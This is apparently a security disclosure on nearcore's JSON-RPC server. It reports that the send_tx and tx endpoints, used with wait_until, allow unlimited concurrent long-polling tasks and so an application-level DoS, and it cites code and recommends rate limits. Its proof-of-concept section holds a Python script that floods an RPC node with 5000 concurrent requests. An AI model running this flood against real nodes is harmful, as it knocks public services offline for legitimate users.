### Title
No Rate Limiting on JSON-RPC HTTP Endpoints Enables Application-Level DoS via Unbounded Long-Polling Task Accumulation — (`File: chain/jsonrpc/src/lib.rs`)

### Summary
The nearcore JSON-RPC HTTP server applies no per-IP, per-connection, or per-method rate limiting. The `send_tx`, `broadcast_tx_commit`, and `tx` endpoints accept a `wait_until` parameter that causes each request to hold a live async task for up to 10 seconds, polling `ViewClientActor` on every new block. An unprivileged attacker can open an unbounded number of concurrent connections, exhausting Tokio task memory and flooding the `ViewClientActor` message queue, rendering the RPC node unavailable without any network-layer amplification. This is application-level DoS, not network-level, and is fixable without a hardfork.

### Finding Description

`create_jsonrpc_app` in `chain/jsonrpc/src/lib.rs` builds the Axum router and applies exactly two middleware layers: CORS and `RequestBodyLimitLayer` (10 MB body cap). No rate-limiting, connection-count, or concurrency-cap layer is present. [1](#0-0) 

When a caller invokes `send_tx` (or the legacy alias `broadcast_tx_commit`) with any `wait_until` value other than `None`, the handler calls `send_tx_internal` and then enters `tx_status_fetch`. That function runs a loop that wakes on every new block notification and sends a fresh `TxStatus` message to `ViewClientActor` each iteration, bounded only by a 10-second `polling_timeout`. [2](#0-1) 

Inside each loop iteration, if the transaction is not yet observed on the tracked shard, `tx_status_fetch_single` additionally calls `detect_invalid_tx`, which dispatches a second `ProcessTxRequest` (with `check_only=true`) to `RpcHandlerActor`. [3](#0-2) [4](#0-3) 

The same long-polling path is reachable through the `tx` endpoint (`tx_status_common`), which also calls `tx_status_fetch` with a caller-supplied `wait_until`. [5](#0-4) 

The transaction pool has a 100 MB size cap, and `RpcHandlerActor` validates transactions before inserting them, so the pool itself is bounded. However, neither of these guards limits the number of concurrent HTTP connections or the number of in-flight `tx_status_fetch` tasks. [6](#0-5) 

By contrast, the peer-to-peer network layer does apply token-bucket rate limits per message type (e.g., `EpochSyncRequest`, `BlockRequest`), and the `StateRequestActor` has its own throttle. The JSON-RPC HTTP surface has no equivalent guard. [7](#0-6) [8](#0-7) 

### Impact Explanation

With NEAR's ~1-second block time, N concurrent `send_tx`/`tx` requests with `wait_until: Final` generate N `TxStatus` messages to `ViewClientActor` per second. For requests whose transaction is not yet on-chain, an additional N `ProcessTxRequest` (check-only) messages are sent to `RpcHandlerActor` per second. At a few thousand concurrent connections this saturates both actors' message queues, preventing legitimate RPC queries (block queries, account queries, etc.) from being processed and making the node's public API unavailable. The impact is application-level DoS of the RPC node — not network-level — and does not require a hardfork to fix.

### Likelihood Explanation

The JSON-RPC port (default 3030) is publicly reachable on any node that exposes RPC. No authentication, no NEAR account, and no gas payment is required to call `tx` or `send_tx`. A single attacker machine can open thousands of concurrent HTTP/1.1 keep-alive connections. The attack is therefore trivially reachable by any unprivileged user.

### Recommendation

Add a rate-limiting middleware layer to the Axum router in `create_jsonrpc_app`. Effective mitigations include:

- A per-IP concurrency limit (e.g., via `tower::limit::ConcurrencyLimit` or a custom `tower` layer) to cap simultaneous in-flight long-polling tasks per source address.
- A per-IP request-rate limit (token bucket) applied before the method dispatch, analogous to the existing `messages_limits` token-bucket used for peer messages.
- A hard cap on the total number of concurrent `tx_status_fetch` tasks across all connections, rejecting new long-poll requests with HTTP 429 when the cap is reached.

These changes are purely in the RPC server layer and require no protocol or consensus changes.

### Proof of Concept

```python
import asyncio, aiohttp, borsh, base64, json

# Craft a syntactically valid but non-existent transaction
DUMMY_TX_B64 = "<base64-encoded borsh SignedTransaction with random hash>"
NODE = "http://<rpc-node>:3030"

async def flood(session, i):
    payload = {
        "jsonrpc": "2.0", "id": i, "method": "tx",
        "params": {
            "signed_tx_base64": DUMMY_TX_B64,
            "wait_until": "FINAL"          # triggers 10-second polling loop
        }
    }
    async with session.post(NODE, json=payload):
        pass   # hold connection open for up to 10 s

async def main():
    connector = aiohttp.TCPConnector(limit=0)
    async with aiohttp.ClientSession(connector=connector) as s:
        await asyncio.gather(*[flood(s, i) for i in range(5000)])

asyncio.run(main())
```

With 5 000 concurrent requests each holding a 10-second polling loop, `ViewClientActor` receives ≥5 000 `TxStatus` messages per block (~1 s), saturating its queue and making the node unresponsive to all other RPC callers for the duration of the flood.

### Citations

**File:** chain/jsonrpc/src/lib.rs (L956-982)
```rust
        let poll_tx_status = async {
            // Create a new watch::Receiver to watch for new blocks. Mark the current block as seen.
            let mut new_block_watcher = self.block_notification_watcher.clone();
            new_block_watcher.mark_unchanged();

            loop {
                match self.tx_status_fetch_single(&tx_info, &finality, fetch_receipt).await {
                    ControlFlow::Break(outcome) => break outcome,
                    ControlFlow::Continue(cause) => timeout_error_cause = cause,
                }
                new_block_watcher.changed().await.map_err(|_| {
                    RpcTransactionError::InternalError {
                        debug_info: "block notification channel closed".to_string(),
                    }
                })?;
            }
        };

        // The polling loop returns on its own once it reaches the requested finality or hits a
        // definitive error; only a timeout falls through to `unwrap_or_else`.
        self.clock
            .timeout(self.polling_config.polling_timeout, poll_tx_status)
            .await
            .unwrap_or_else(|_| {
                self.tx_status_on_timeout(&tx_info, fetch_receipt, timeout_error_cause)
            })
    }
```

**File:** chain/jsonrpc/src/lib.rs (L1013-1025)
```rust
            Ok(TxStatusOutcome::NotObserved) => {
                if let Err(context) = self.detect_invalid_tx(tx_info).await {
                    return ControlFlow::Break(Err(RpcTransactionError::InvalidTransaction {
                        context,
                    }));
                }
                if *finality == TxExecutionStatus::None {
                    ControlFlow::Break(Err(RpcTransactionError::UnknownTransaction {
                        requested_transaction_hash: tx_hash,
                    }))
                } else {
                    ControlFlow::Continue(TimeoutErrorCause::NotObserved)
                }
```

**File:** chain/jsonrpc/src/lib.rs (L1064-1070)
```rust
    async fn detect_invalid_tx(&self, tx_info: &TransactionInfo) -> Result<(), InvalidTxError> {
        let Some(tx) = tx_info.to_signed_tx() else { return Ok(()) };
        match self.send_tx_internal(tx.clone(), true).await {
            Ok(ProcessTxResponse::InvalidTx(context)) => Err(context),
            _ => Ok(()),
        }
    }
```

**File:** chain/jsonrpc/src/lib.rs (L1911-1925)
```rust
    async fn tx_status_common(
        &self,
        request_data: near_jsonrpc_primitives::types::transactions::RpcTransactionStatusRequest,
        fetch_receipt: bool,
    ) -> Result<
        near_jsonrpc_primitives::types::transactions::RpcTransactionResponse,
        near_jsonrpc_primitives::types::transactions::RpcTransactionError,
    > {
        metrics::report_wait_until_metric("tx_status", &request_data.wait_until);

        let tx_status = self
            .tx_status_fetch(request_data.transaction_info, request_data.wait_until, fetch_receipt)
            .await?;
        Ok(tx_status.rpc_into())
    }
```

**File:** chain/jsonrpc/src/lib.rs (L3092-3121)
```rust
    // Build router
    let mut app = Router::new()
        .route("/", post(rpc_handler))
        .route("/status", get(status_handler).head(status_handler))
        .route("/health", get(health_handler).head(health_handler))
        .route("/network_info", get(network_info_handler))
        .route("/metrics", get(prometheus_handler))
        .route("/openapi.json", get(openapi_json_handler));

    if enable_debug_rpc {
        app = app
            .route("/debug/api/entity", post(handle_entity_debug))
            .route(
                "/debug/api/block_status/{starting_height}",
                #[allow(deprecated)]
                get(deprecated_debug_block_status_handler),
            )
            .route("/debug/api/block_status", get(debug_block_status_handler))
            .route("/debug/api/epoch_info/{epoch_id}", get(debug_epoch_info_handler))
            .route("/debug/api/epoch_info_light/{epoch_id}", get(debug_epoch_info_light_handler))
            .route("/debug/api/instrumented_threads", get(debug_instrumented_threads_handler))
            .route("/debug/api/{*api_path}", get(debug_handler))
            .route("/debug/client_config", get(client_config_handler))
            .route("/debug", get(debug_html))
            .route("/debug/pages/{page}", get(display_debug_html));
    }

    app.layer(get_cors(&cors_allowed_origins))
        .layer(RequestBodyLimitLayer::new(limits_config.json_payload_max_size))
        .with_state(handler)
```

**File:** chain/network/src/rate_limits/messages_limits.rs (L104-122)
```rust
    /// Returns a good preset of rate limit configuration valid for any type of node.
    pub fn standard_preset() -> Self {
        // TODO(trisfald): make presets for other message types
        let mut config = Self::default();
        // EpochSyncRequest is a very simple amplification attack vector, as it requires no arguments
        // and the response is large. So we rate limit it to 1 request per 30 seconds. In practice,
        // a peer should not need to epoch sync except when bootstrapping a node, so a request
        // should be rarely received. We still set it to a reasonable rate limit so a bootstrapping
        // node can retry without waiting for too long.
        config.rate_limits.insert(
            RateLimitedPeerMessageKey::EpochSyncRequest,
            SingleMessageConfig::new(1, 1.0 / 30.0, None),
        );
        config.rate_limits.insert(
            RateLimitedPeerMessageKey::EpochSyncResponse,
            SingleMessageConfig::new(1, 1.0 / 30.0, None),
        );
        config
    }
```

**File:** chain/client/src/state_request_actor.rs (L72-91)
```rust
    /// Returns true if this request needs to be **dropped** due to exceeding a
    /// rate limit of state sync requests.
    fn throttle_state_sync_request(&self) -> bool {
        let mut timestamps = self.state_request_timestamps.lock();
        let now = self.clock.now();
        while let Some(&instant) = timestamps.front() {
            // Assume that time is linear. While in different threads there might be some small differences,
            // it should not matter in practice.
            if now - instant > self.throttle_period {
                timestamps.pop_front();
            } else {
                break;
            }
        }
        if timestamps.len() >= self.num_state_requests_per_throttle_period {
            return true;
        }
        timestamps.push_back(now);
        false
    }
```
